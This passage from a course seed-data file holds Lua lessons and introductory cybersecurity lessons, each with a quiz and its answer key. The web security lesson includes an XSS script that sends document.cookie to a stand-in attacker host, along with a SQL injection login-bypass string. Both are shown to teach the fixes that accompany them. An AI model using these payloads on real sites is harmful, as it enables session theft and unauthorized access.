      `Lua doesn't have try/catch, instead errors are handled with the built-in functions \`pcall\`, \`xpcall\`, \`error\`, and \`assert\`.\n\n## Raising errors\n\n\`\`\`lua\nlocal function withdraw(balance, amount)\n  if amount > balance then\n    error("insufficient funds")\n  end\n  return balance - amount\nend\n\`\`\`\n\nCalling \`error(message)\` immediately stops execution and unwinds the call stack, exactly like \`throw\` in other languages, except the "catch" is a separate function call rather than a block.\n\n## Catching errors with pcall\n\n\`\`\`lua\nlocal ok, result = pcall(withdraw, 100, 150)\n\nif ok then\n  print("New balance: " .. result)\nelse\n  print("Failed: " .. result) -- result holds the error message here\nend\n\`\`\`\n\n\`pcall\` ("protected call") runs a function and catches any error it raises. It always returns a boolean first (\`true\` if no error, \`false\` if one occurred), followed by either the function's return value(s), or the error message.\n\n## assert: a shortcut for a common check\n\n\`\`\`lua\nlocal function withdraw(balance, amount)\n  assert(amount <= balance, "insufficient funds")\n  return balance - amount\nend\n\`\`\`\n\n\`assert(condition, message)\` is sugar for "if condition is falsy, error(message)", used constantly to validate function arguments up front.\n\n## xpcall: catching errors with a custom handler\n\n\`\`\`lua\nlocal function riskyOperation()\n  error({ code = 42, reason = "something broke" }) -- errors can be any value, not just strings\nend\n\nlocal ok, err = xpcall(riskyOperation, function(e)\n  if type(e) == "table" then\n    return "Error " .. e.code .. ": " .. e.reason\n  end\n  return tostring(e)\nend)\n\nprint(err) -- Error 42: something broke\n\`\`\`\n\n\`xpcall\` is like \`pcall\` but takes a second argument, a **message handler** that runs while the stack is still unwound (useful for attaching a stack trace, or normalizing non-string error values like the table above).\n\n> [!TIP]\n> Reach for \`assert\` for "this should never happen if the caller used the API correctly" checks, and reserve \`error\` + \`pcall\` for situations the caller is expected to actually handle, like a failed network request or invalid user input.`
    ),
    quiz: {
      title: 'Error Handling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does pcall return first, before any of the wrapped function's own results?",
          options: ['The error message', 'A boolean success flag', 'Nothing', 'The function itself'],
          answer: 'A boolean success flag',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In Lua, error() can only be called with a string message.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____(condition, message) raises an error with the given message if condition is falsy.',
          options: [],
          answer: 'assert',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Contact Book with Validated Errors',
    content: lessonContent(
      'Final Project: Build a Contact Book with Validated Errors',
      `Combine closures, OOP, patterns, and error handling into one small but real program: a contact book.\n\n## Requirements\n\n1. Model a \`ContactBook\` "class" (metatable + \`__index\`, like the Object-Oriented lesson) with methods to add, remove, and list contacts.\n2. Each contact needs a name and an email; validate the email with a string pattern (at minimum, requires an \`@\` and at least one \`.\` after it) and \`error()\`/\`assert()\` if it's invalid.\n3. Wrap every call that adds a contact in \`pcall\`, so a bad email prints a friendly error message instead of crashing the whole program.\n4. Add a \`search(term)\` method that uses \`string.find\` or \`gmatch\` to return every contact whose name contains \`term\` (case-insensitive).\n5. Use a closure to track how many contacts have ever been added in total (including ones later removed), exposed through a \`ContactBook:totalEverAdded()\` method, without storing it as a plain field on the instance.\n\n## Stretch goals\n\n- Support multiple emails per contact (a table of emails instead of one string).\n- Add an \`export()\` method that returns a single formatted string listing every contact, built with \`table.concat\`.\n- Persist contacts to a file with Lua's \`io\` library and reload them on startup (only relevant if you're running outside this course's browser sandbox).\n\nSubmit a link to your finished script (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const luaAdvancedLessons: SeedLesson[] = [
  {
    title: 'Coroutines: Cooperative Multitasking',
    content: lessonContent(
      'Coroutines: Cooperative Multitasking',
      `A **coroutine** is an independent thread of execution that you can pause and resume by hand, unlike OS threads, only one coroutine (or the main program) ever runs at a time, so there's no race condition to worry about.\n\n## Creating and resuming a coroutine\n\n\`\`\`lua\nlocal co = coroutine.create(function(a, b)\n  print("start", a, b)\n  local c = coroutine.yield(a + b) -- pauses here, returns a + b to the resumer\n  print("resumed with", c)\n  return "done"\nend)\n\nprint(coroutine.resume(co, 1, 2)) -- true  3   (prints "start 1  2" first)\nprint(coroutine.resume(co, 10))    -- true  done  (prints "resumed with  10" first)\nprint(coroutine.status(co))         -- dead\n\`\`\`\n\n- \`coroutine.create(fn)\` builds a coroutine **without** running it yet.\n- \`coroutine.resume(co, ...)\` starts/continues it, passing \`...\` in as arguments (either to the function itself, the first time, or as \`coroutine.yield\`'s return value on later resumes).\n- \`coroutine.yield(...)\` pauses the coroutine and hands \`...\` back to whoever called \`resume\`.\n- \`coroutine.status(co)\` reports \`"suspended"\`, \`"running"\`, \`"normal"\`, or \`"dead"\`.\n\n## A generator built on coroutines\n\n\`\`\`lua\nlocal function numberGenerator(limit)\n  return coroutine.wrap(function()\n    for i = 1, limit do\n      coroutine.yield(i)\n    end\n  end)\nend\n\nfor n in numberGenerator(5) do\n  print(n) -- 1 2 3 4 5, one per iteration\nend\n\`\`\`\n\n\`coroutine.wrap\` is \`coroutine.create\` plus automatic \`resume\` calls, wrapped in a plain function you can call directly (or use in a \`for ... in\` loop), it's the idiomatic way to build a lazy generator/iterator in Lua.\n\n> [!WARNING]\n> Unlike \`pcall\`, an error raised inside a coroutine created with \`coroutine.wrap\` propagates as a normal Lua error to the caller of the wrapped function. A coroutine made with plain \`coroutine.create\`, by contrast, reports the error as its second \`resume\` return value instead of raising it, check \`coroutine.resume\`'s boolean result if you use \`create\` directly.`
    ),
    quiz: {
      title: 'Coroutines Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does coroutine.yield do?',
          options: [
            'Terminates the coroutine permanently',
            'Pauses the coroutine and returns values to the resumer',
            'Creates a new coroutine',
            'Raises an error',
          ],
          answer: 'Pauses the coroutine and returns values to the resumer',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two Lua coroutines can execute simultaneously on separate CPU cores.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____.wrap(fn) returns a plain callable function that automatically resumes the coroutine each call, ideal for building generators.',
          options: [],
          answer: 'coroutine',
        },
      ],
    },
  },
  {
    title: 'Advanced Metatables: Operator Overloading & __call',
    content: lessonContent(
      'Advanced Metatables: Operator Overloading & __call',
      `Fundamentals covered \`__index\` for method lookup. Metatables support many more **metamethods** that let a table respond to operators, comparisons, \`tostring\`, and even being called like a function.\n\n## Operator overloading\n\n\`\`\`lua\nlocal Vector = {}\nVector.__index = Vector\n\nfunction Vector.new(x, y)\n  return setmetatable({ x = x, y = y }, Vector)\nend\n\nVector.__add = function(a, b)\n  return Vector.new(a.x + b.x, a.y + b.y)\nend\n\nVector.__tostring = function(v)\n  return string.format("(%g, %g)", v.x, v.y)\nend\n\nVector.__eq = function(a, b)\n  return a.x == b.x and a.y == b.y\nend\n\nlocal v1 = Vector.new(1, 2)\nlocal v2 = Vector.new(3, 4)\n\nprint(v1 + v2)          -- (4, 6), uses __add, then __tostring for print\nprint(v1 == Vector.new(1, 2)) -- true, uses __eq\n\`\`\`\n\n\`print(v1 + v2)\` runs \`__add\` to build a new \`Vector\`, then \`print\` calls \`tostring\` on it, which invokes \`__tostring\`. Without \`__tostring\`, printing a table falls back to Lua's default \`table: 0x...\` representation.\n\n## __call: making a table callable\n\n\`\`\`lua\nlocal Multiplier = setmetatable({ factor = 3 }, {\n  __call = function(self, n)\n    return n * self.factor\n  end,\n})\n\nprint(Multiplier(10)) -- 30, calling the table like a function\n\`\`\`\n\n\`__call\` is what lets some libraries expose an object that's both a table of methods/config **and** directly invokable.\n\n## __newindex: intercepting new keys\n\n\`\`\`lua\nlocal readOnly = setmetatable({ pi = 3.14159 }, {\n  __newindex = function(_, key, _)\n    error("cannot set '" .. key .. "', this table is read-only")\n  end,\n})\n\nprint(readOnly.pi) -- 3.14159, ordinary reads still work\nreadOnly.pi = 4     -- errors: cannot set 'pi', this table is read-only\n\`\`\`\n\n\`__newindex\` only fires when you assign to a key that **doesn't already exist** in the table, it's the standard trick for building read-only tables, or a proxy that validates/logs writes.\n\n> [!NOTE]\n> There's a matching, easy-to-miss rule: \`__index\` (as a function) only fires on a **missing-key read**, and \`__newindex\` only fires on a **missing-key write**. Once a key genuinely exists on the table itself, both metamethods are bypassed entirely for that key.`
    ),
    quiz: {
      title: 'Advanced Metatables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which metamethod lets a table be invoked like a function, e.g. myTable(10)?',
          options: ['__index', '__call', '__newindex', '__tostring'],
          answer: '__call',
        },
        {
          type: 'TRUE_FALSE',
          prompt: '__newindex fires every time you assign to any key on a table, even one that already exists.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Overloading the + operator for a custom table is done by defining the ____ metamethod.',
          options: [],
          answer: '__add',
        },
      ],
    },
  },
  {
    title: 'Variadic Functions and table.pack/unpack',
    content: lessonContent(
      'Variadic Functions and table.pack/unpack',
      `Lua functions can accept a variable number of arguments using \`...\` (the **vararg expression**), and tables can be converted to and from argument lists with \`table.pack\`/\`table.unpack\`.\n\n## Accepting any number of arguments\n\n\`\`\`lua\nlocal function sum(...)\n  local total = 0\n  for _, n in ipairs({...}) do\n    total = total + n\n  end\n  return total\nend\n\nprint(sum(1, 2, 3))        -- 6\nprint(sum(10, 20, 30, 40)) -- 100\n\`\`\`\n\n\`{...}\` packs all the varargs into a plain table, from there \`ipairs\` works as usual. This breaks down if any argument is \`nil\`, though, since \`ipairs\` stops at the first \`nil\`.\n\n## select: inspecting varargs directly\n\n\`\`\`lua\nlocal function describe(...)\n  print("got " .. select("#", ...) .. " arguments")\n  print(select(2, ...)) -- every argument from position 2 onward\nend\n\ndescribe("a", "b", "c") -- got 3 arguments  /  b  c\n\`\`\`\n\n\`select("#", ...)\` returns the exact argument count, **including trailing nils**, unlike \`#{...}\` which can undercount if a \`nil\` is in the middle or at the end. \`select(n, ...)\` returns every argument from position \`n\` onward.\n\n## table.pack and table.unpack\n\n\`\`\`lua\nlocal function packed(...)\n  return table.pack(...) -- { n = 3, 1, 2, 3 } for example\nend\n\nlocal args = packed(1, 2, 3)\nprint(args.n, args[1], args[2], args[3]) -- 3  1  2  3\n\nprint(table.unpack({10, 20, 30})) -- 10  20  30, spreads a table back into multiple values\n\`\`\`\n\n\`table.pack(...)\` is exactly \`{...}\` plus a reliable \`n\` field for the true count (nil-safe, unlike \`#\`). \`table.unpack(t)\` does the reverse, spreading a table's elements out as individual values, handy for forwarding a captured argument list to another function: \`someFn(table.unpack(args))\`.\n\n> [!TIP]\n> A common pattern is combining both: capture arguments now with \`table.pack\`, and call a function with them later using \`table.unpack\`, effectively deferring a function call, exactly what you'd reach for spread syntax for in JavaScript.`
    ),
    quiz: {
      title: 'Varargs Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which expression reliably returns the exact count of varargs, including trailing nils?',
          options: ['#{...}', 'select("#", ...)', '#select(...)', 'table.count(...)'],
          answer: 'select("#", ...)',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "table.unpack takes a table and spreads its elements out as individual return values.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "Lua's ____ expression (three dots) lets a function accept any number of arguments, e.g. function f(...).",
          options: [],
          answer: '...',
        },
      ],
    },
  },
  {
    title: 'Garbage Collection & Weak Tables',
    content: lessonContent(
      'Garbage Collection & Weak Tables',
      `Lua manages memory automatically with a garbage collector (GC), you never manually free a table, but understanding roughly how the GC decides what's collectible helps you avoid subtle memory leaks in long-running programs (like a game server that stays up for days).\n\n## How collection works, briefly\n\nLua's GC is a **tracing** collector: starting from a set of "roots" (globals, the currently running stack, etc.), it walks every reachable table/value and keeps them, anything unreachable gets freed. This means a table is eligible for collection the moment *nothing* still holds a reference to it, you don't need to null it out explicitly the way you might in a manual-memory language, though setting a local to \`nil\` when you're done with a large table can help it get collected sooner rather than later.\n\n\`\`\`lua\ncollectgarbage("collect") -- forces a full garbage collection cycle\nprint(collectgarbage("count")) -- current memory use, in kilobytes\n\`\`\`\n\n\`collectgarbage\` is rarely called manually in normal code, Lua runs the collector incrementally on its own, but it's useful when profiling memory use or right before measuring memory in a benchmark.\n\n## The leak you don't expect: caches\n\n\`\`\`lua\nlocal cache = {}\n\nlocal function getUser(id, fetchFn)\n  if not cache[id] then\n    cache[id] = fetchFn(id)\n  end\n  return cache[id]\nend\n\`\`\`\n\nThis looks harmless, but \`cache\` holds a **strong reference** to every entry forever, even after nothing else in the program cares about that user anymore. In a long-running process, this cache only grows.\n\n## Weak tables\n\n\`\`\`lua\nlocal cache = setmetatable({}, { __mode = "v" }) -- weak values\n\nlocal function getUser(id, fetchFn)\n  if not cache[id] then\n    cache[id] = fetchFn(id)\n  end\n  return cache[id]\nend\n\`\`\`\n\n\`__mode = "v"\` makes the table's **values** weak references, if nothing else in the program still holds a strong reference to a cached value, the garbage collector is free to remove that entry from \`cache\` automatically on its next pass. \`__mode = "k"\` does the same for keys, and \`__mode = "kv"\` makes both weak, useful for building a side-table that attaches extra data to objects without preventing those objects from ever being collected.\n\n> [!WARNING]\n> Weak tables only help if the *values themselves* are collectible tables/userdata elsewhere, numbers and strings are never weakly held the way you might expect (small numbers and short strings in particular are effectively "immortal" values in Lua's implementation), so \`__mode = "v"\` won't shrink a cache whose values are plain numbers.`
    ),
    quiz: {
      title: 'GC & Weak Tables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "Setting __mode = 'v' on a table's metatable makes...",
          options: [
            'Its keys weak references',
            'Its values weak references',
            'The whole table immutable',
            'It stop participating in garbage collection entirely',
          ],
          answer: 'Its values weak references',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A table becomes eligible for garbage collection only once nothing in the program still holds a reference to it.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____("collect") forces Lua to run a full garbage collection cycle immediately.',
          options: [],
          answer: 'collectgarbage',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Tiny Event Emitter with Coroutines',
    content: lessonContent(
      'Final Project: Build a Tiny Event Emitter with Coroutines',
      `Combine coroutines, metatables, and varargs into a small pub/sub event emitter, a pattern used constantly in game engines and GUI frameworks.\n\n## Requirements\n\n1. Build an \`EventEmitter\` "class" (metatable-based, like earlier OOP lessons) with \`on(event, handler)\`, \`off(event, handler)\`, and \`emit(event, ...)\` methods. \`emit\` should forward any extra arguments straight to every registered handler using varargs.\n2. Support **multiple handlers** per event name, stored in a table keyed by event name, each holding a list of handler functions.\n3. Wrap each handler call in \`pcall\` inside \`emit\`, so one broken handler doesn't stop the rest of that event's handlers from running, log a warning for the failing one instead.\n4. Add an \`onceAsync(event)\` method that returns a coroutine-based helper: calling it pauses (via \`coroutine.yield\`) until the named event next fires, then resumes with that event's arguments, essentially turning a callback-style event into something you can "await" step by step.\n5. Use a weak table (\`__mode = "k"\`) to track any per-listener metadata you add (e.g. a registration timestamp) so that metadata doesn't keep a removed handler function alive forever.\n\n## Stretch goals\n\n- Add wildcard subscriptions (\`emitter:on("*", handler)\` fires on every event).\n- Add a \`once(event, handler)\` convenience method that automatically calls \`off\` after the handler's first invocation.\n- Benchmark emitting 10,000 events with \`os.clock()\` before and after switching a hot path from \`pairs\` to \`ipairs\` where applicable, and note the difference.\n\nSubmit a link to your finished script (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const cybersecurityLessons: SeedLesson[] = [
  {
    title: 'Introduction to Cybersecurity',
    content: lessonContent(
      'Introduction to Cybersecurity',
      `Cybersecurity is the practice of protecting systems, networks, and data from unauthorized access, disruption, or theft. Every decision in security is a tradeoff between usability, cost, and risk, there is no such thing as a perfectly secure system, only one whose risk has been reduced to an acceptable level.\n\n## The CIA triad\n\nAlmost every security control exists to protect one of three properties:\n\n| Property | Meaning | Example attack that breaks it |\n|---|---|---|\n| **Confidentiality** | Only authorized people can read the data | Stealing a database of passwords |\n| **Integrity** | Data cannot be modified without detection | Tampering with a bank transfer amount in transit |\n| **Availability** | Systems stay up and usable | A denial-of-service attack that takes a site offline |\n\n## Key vocabulary\n\n- **Asset**: anything worth protecting (a server, a database, a customer's data).\n- **Threat**: anything that could cause harm to an asset (an attacker, a bug, a flood).\n- **Vulnerability**: a weakness that a threat could exploit (unpatched software, a weak password policy).\n- **Exploit**: the specific technique used to take advantage of a vulnerability.\n- **Risk**: the likelihood of a threat exploiting a vulnerability, multiplied by the impact if it does.\n\n> [!TIP]\n> A useful mental model: **Risk = Threat × Vulnerability × Impact**. Security work usually focuses on reducing vulnerability (patching, configuration) since you can rarely control the threat itself.\n\n## Why this matters even if you're "just" a developer\n\nMost real-world breaches don't start with an exotic zero-day, they start with an unpatched dependency, a misconfigured cloud bucket, or a form field that trusts user input a little too much. Security is not a separate team's job bolted on at the end, it's a property of the code you write every day.`
    ),
    quiz: {
      title: 'Cybersecurity Basics',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of the CIA triad properties does a denial-of-service attack primarily target?',
          options: ['Confidentiality', 'Integrity', 'Availability', 'Accountability'],
          answer: 'Availability',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A vulnerability and an exploit mean the same thing.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A weakness in a system that a threat could take advantage of is called a ____.',
          options: [],
          answer: 'vulnerability',
        },
      ],
    },
  },
  {
    title: 'Common Attack Vectors',
    content: lessonContent(
      'Common Attack Vectors',
      `An **attack vector** is the path or method an attacker uses to gain unauthorized access. Most breaches use one of a small handful of well-known vectors, understanding them is most of what it takes to defend against them.\n\n## Social engineering\n\nThe majority of breaches start by manipulating a person, not a machine:\n\n- **Phishing**: fraudulent emails or messages that impersonate a trusted source to trick someone into clicking a link, entering credentials, or opening an attachment.\n- **Spear phishing**: a targeted phishing attack aimed at a specific person, using details about them (their job title, a real coworker's name) to look convincing.\n- **Pretexting**: inventing a false scenario ("I'm from IT, I need your password to fix an issue") to extract information.\n\n## Malware\n\n| Type | What it does |\n|---|---|\n| Virus | Attaches to a legitimate file, spreads when that file runs |\n| Worm | Spreads on its own across a network, no host file needed |\n| Trojan | Disguised as legitimate software, opens a backdoor once installed |\n| Ransomware | Encrypts a victim's files and demands payment for the key |\n| Spyware | Silently collects information (keystrokes, browsing habits) |\n\n## Brute force and credential attacks\n\n- **Brute force**: trying every possible password combination.\n- **Dictionary attack**: trying common passwords or leaked password lists instead of every combination, far faster in practice.\n- **Credential stuffing**: reusing username/password pairs leaked from one breach to try logging into other, unrelated services, this is why reusing passwords across sites is so dangerous.\n\n> [!WARNING]\n> Credential stuffing works because people reuse passwords. A single breached, low-security forum can lead directly to a compromised email or bank account if the same password was reused.`
    ),
    quiz: {
      title: 'Attack Vectors Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which malware type spreads across a network on its own, without needing a host file?',
          options: ['Virus', 'Worm', 'Trojan', 'Spyware'],
          answer: 'Worm',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Credential stuffing relies on people reusing the same password across multiple sites.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A phishing attack that is specifically targeted at one individual using personal details is called ____ phishing.',
          options: [],
          answer: 'spear',
        },
      ],
    },
  },
  {
    title: 'Network Security Basics',
    content: lessonContent(
      'Network Security Basics',
      `Every device that talks to a network exposes an **attack surface**, the sum of all the points where an attacker could try to get in. Network security is largely about shrinking that surface and controlling what is allowed to cross it.\n\n## Ports and protocols\n\nA port identifies a specific service running on a machine. A handful show up constantly:\n\n| Port | Protocol | Purpose |\n|---|---|---|\n| 22 | SSH | Encrypted remote shell access |\n| 80 | HTTP | Unencrypted web traffic |\n| 443 | HTTPS | Encrypted web traffic (TLS) |\n| 25 | SMTP | Sending email |\n| 3389 | RDP | Remote desktop (Windows) |\n\nTCP is connection-oriented and guarantees delivery order (used for web pages, file transfers), UDP is connectionless and faster but can drop or reorder packets (used for video calls, DNS lookups).\n\n## Firewalls\n\nA firewall inspects traffic and decides what to allow or block, based on rules like source IP, destination port, or protocol.\n\n\`\`\`bash\n# Example: a rule that only allows SSH from a specific trusted IP\nsudo ufw allow from 203.0.113.10 to any port 22\nsudo ufw deny 22\n\`\`\`\n\nThe principle behind good firewall rules is **default deny**: block everything, then explicitly allow only what is needed. This is much safer than trying to enumerate every bad thing to block.\n\n## VPNs\n\nA VPN (Virtual Private Network) creates an encrypted tunnel between a device and a private network over the public internet, so traffic can't be read or tampered with by anyone in between, useful for accessing internal company systems securely from an untrusted network like public Wi-Fi.\n\n> [!TIP]\n> "Attack surface" isn't just about open ports, every dependency, every exposed API endpoint, and every user input field is also part of your attack surface.`
    ),
    quiz: {
      title: 'Network Security Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which port is conventionally used for encrypted HTTPS web traffic?',
          options: ['21', '80', '443', '3389'],
          answer: '443',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A "default deny" firewall policy blocks everything by default and only explicitly allows what is needed.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A ____ creates an encrypted tunnel between a device and a private network over the public internet.',
          options: [],
          answer: 'VPN',
        },
      ],
    },
  },
  {
    title: 'Web Application Security & the OWASP Top 10',
    content: lessonContent(
      'Web Application Security & the OWASP Top 10',
      `The **OWASP Top 10** is the industry-standard list of the most critical web application security risks. Three of the most common show up constantly in real applications:\n\n## SQL injection\n\nWhen user input is concatenated directly into a SQL query, an attacker can change the query's meaning entirely:\n\n\`\`\`js\n// Vulnerable: user input goes straight into the query string\nconst query = \`SELECT * FROM users WHERE username = '\${username}'\`;\n\n// If username is:  ' OR '1'='1\n// The query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'\n// ...which matches every row, bypassing the login check entirely\n\`\`\`\n\n**Fix**: always use parameterized queries / prepared statements, which send the input separately from the query structure so it can never be interpreted as SQL:\n\n\`\`\`js\n// Safe: the database driver handles escaping, input is never treated as SQL\nawait db.query('SELECT * FROM users WHERE username = ?', [username]);\n\`\`\`\n\n## Cross-site scripting (XSS)\n\nXSS happens when an attacker gets their own JavaScript to run in another user's browser, usually by injecting a \`<script>\` tag into content that gets rendered without escaping:\n\n\`\`\`html\n<!-- If a comment field is rendered without escaping, and a user submits: -->\n<script>fetch('https://evil.example/steal?cookie=' + document.cookie)</script>\n<!-- ...that script now runs in every other visitor's browser who views the comment -->\n\`\`\`\n\n**Fix**: escape user-generated content before rendering it as HTML (most modern frameworks like React do this by default), and use a Content-Security-Policy header to restrict what scripts are allowed to run at all.\n\n## Cross-site request forgery (CSRF)\n\nCSRF tricks a logged-in user's browser into submitting a request they didn't intend to make, since browsers automatically attach cookies to requests, a malicious site can make your browser send a request to a site you're logged into.\n\n**Fix**: require a unique, unpredictable CSRF token on state-changing requests (form submissions, not just GET requests), and set cookies with \`SameSite=Strict\` or \`SameSite=Lax\` so they aren't sent on cross-site requests.\n\n> [!WARNING]\n> The common thread across all three: **never trust user input**. Validate it, escape it for the context it's used in (SQL, HTML, a shell command), and use APIs (parameterized queries, templating engines) that make the safe way the easy way.`
    ),
    quiz: {
      title: 'OWASP Top 10 Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the recommended fix for SQL injection?',
          options: [
            'Blocking the letter O in user input',
            'Parameterized queries / prepared statements',
            'Only allowing admins to log in',
            'Using a longer database password',
          ],
          answer: 'Parameterized queries / prepared statements',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Setting cookies with SameSite=Strict or SameSite=Lax helps defend against CSRF.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'An attack where malicious JavaScript is injected into a page and runs in other users\' browsers is called cross-site ____.',
          options: [],
          answer: 'scripting',
        },
      ],
    },
  },
  {
    title: 'Cryptography Basics',
    content: lessonContent(
      'Cryptography Basics',
      `Cryptography underpins almost every security control: HTTPS, password storage, and secure messaging all depend on it. You don't need to implement algorithms yourself, but you do need to know which tool fits which job.\n\n## Hashing vs. encryption\n\nThese are often confused, but solve different problems:\n\n| | Hashing | Encryption |\n|---|---|---|\n| Direction | One-way, cannot be reversed | Two-way, can be decrypted with the right key |\n| Use case | Verifying passwords, detecting tampering | Protecting data you need to read again later |\n| Example | \`bcrypt\`, \`SHA-256\` | AES, RSA |\n\n**Never store passwords in plain text, and never encrypt them either**, always hash them with a slow, salted algorithm designed for passwords, like bcrypt:\n\n\`\`\`js\nimport bcrypt from 'bcryptjs';\n\nconst passwordHash = await bcrypt.hash(plainTextPassword, 10); // 10 = cost factor\nconst matches = await bcrypt.compare(attemptedPassword, passwordHash);\n\`\`\`\n\nbcrypt is deliberately slow and includes a random **salt** per password, so two identical passwords produce different hashes, and brute-forcing many hashes at once can't be sped up with a precomputed table (a "rainbow table").\n\n## Symmetric vs. asymmetric encryption\n\n- **Symmetric**: the same key encrypts and decrypts (AES). Fast, but both parties need to already share the key securely.\n- **Asymmetric**: a public key encrypts, only the matching private key can decrypt (RSA). Slower, but solves the key-sharing problem, you can publish your public key freely.\n\n## TLS/HTTPS\n\nHTTPS uses both: an asymmetric handshake to securely agree on a shared secret, then fast symmetric encryption for the actual data transfer. This is why the browser padlock icon means the connection is encrypted and the server's identity was verified by a certificate, but it says nothing about whether the site itself is trustworthy.\n\n> [!TIP]\n> "Encrypted" is not the same as "secure": a phishing site can have a valid HTTPS certificate too. TLS protects data in transit, it doesn't vouch for who's on the other end.`
    ),
    quiz: {
      title: 'Cryptography Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which is the correct way to store user passwords?',
          options: [
            'Encrypt them with AES so they can be decrypted if needed',
            'Hash them with a slow, salted algorithm like bcrypt',
            'Store them in plain text for easy lookup',
            'Encode them with Base64',
          ],
          answer: 'Hash them with a slow, salted algorithm like bcrypt',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A valid HTTPS certificate guarantees that a website itself is trustworthy, not just that the connection is encrypted.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'In ____ encryption, the same key is used to both encrypt and decrypt the data.',
          options: [],
          answer: 'symmetric',
        },
      ],
    },
  },
  {
    title: 'Authentication & Access Control',
    content: lessonContent(
      'Authentication & Access Control',
      `Authentication answers "who are you?", authorization (access control) answers "what are you allowed to do?". Getting both right is one of the highest-leverage things you can do for an application's security.\n\n## Strong password practices\n\n- Enforce a minimum length (length matters far more than forcing arbitrary symbol/number rules).\n- Check new passwords against known breached-password lists, not just complexity rules.\n- Never limit maximum password length aggressively or block pasting into password fields, both push users toward weaker, reused passwords.\n\n## Multi-factor authentication (MFA)\n\nMFA requires two or more of these independent factors:\n\n1. **Something you know** (a password, a PIN)\n2. **Something you have** (a phone, a hardware security key)\n3. **Something you are** (a fingerprint, facial recognition)\n\nEven if a password is stolen through phishing, MFA stops most account takeovers because the attacker also needs the second factor.\n\n## The principle of least privilege\n\nEvery user, process, and service should have the **minimum** access needed to do its job, nothing more. A web server that only needs to read a database table shouldn't have a database account that can also drop tables.\n\n## Role-based access control (RBAC)\n\nRather than granting permissions to individuals one by one, RBAC groups permissions into roles (like \`STUDENT\`, \`INSTRUCTOR\`, \`ADMIN\`), and assigns users to roles. This makes access easy to reason about and audit, when someone changes teams, you change their role, not a long list of individual permissions.\n\n\`\`\`js\n// Checking a role before allowing an action, a simple RBAC check\nfunction requireRole(user, ...allowedRoles) {\n  if (!allowedRoles.includes(user.role)) {\n    throw new Error('Forbidden: insufficient permissions');\n  }\n}\n\`\`\`\n\n> [!WARNING]\n> Access control bugs are rarely about the check being wrong, they're about a check being **missing** entirely on one endpoint. Every action that changes or reveals data needs its own explicit authorization check, don't assume that hiding a button in the UI is enough, the API endpoint itself must enforce it.`
    ),
    quiz: {
      title: 'Auth & Access Control Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which of these is an example of the "something you have" MFA factor?',
          options: ['A password', 'A fingerprint', 'A hardware security key', 'A security question'],
          answer: 'A hardware security key',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The principle of least privilege means giving every user or service the minimum access needed to do its job.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Grouping permissions into named roles like STUDENT, INSTRUCTOR, and ADMIN, then assigning users to roles, is called ____-based access control.',
          options: [],
          answer: 'role',
        },
      ],
    },
  },
  {
    title: 'Final Project: Security Audit Report',
    content: lessonContent(
      'Final Project: Security Audit Report',
